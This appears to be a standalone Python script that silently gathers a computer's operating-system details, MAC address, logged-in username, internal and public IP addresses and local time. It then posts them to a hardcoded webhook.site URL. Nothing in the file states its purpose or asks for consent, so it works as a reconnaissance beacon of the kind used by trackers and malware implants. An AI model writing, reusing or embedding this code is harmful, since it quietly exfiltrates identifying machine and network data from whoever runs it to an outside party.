import socket
import platform
import getpass
import time
import requests

from uuid import getnode as get_mac


WEBHOOK = 'https://webhook.site/d757316b-bf78-4296-8d67-2c4dfd2924bd'
IP_URL = 'https://api.ipify.org?format=json'


def get_internal_ip():
    return socket.gethostbyname(socket.getfqdn())


def get_external_ip():
    public_ip = requests.get(IP_URL)
    return public_ip.json()['ip']


def get_os_params():
    os = platform.uname()
    mac = get_mac()
    user = getpass.getuser()
    return os, mac, user


def get_time():
    time_ = time.localtime()
    ltime = time.strftime("%H:%M:%S", time_)
    return ltime


def summarize() -> dict:
    params = dict()
    params['os'] = get_os_params()[0]
    params['mac'] = get_os_params()[1]
    params['user'] = get_os_params()[2]
    params['ips'] = {
        'internal_ip': get_internal_ip(),
        'external_ip': get_external_ip()
    },
    params['localtime'] = get_time()
    return params


if __name__ == "__main__":
    data = summarize()
    requests.post(WEBHOOK, json=data)





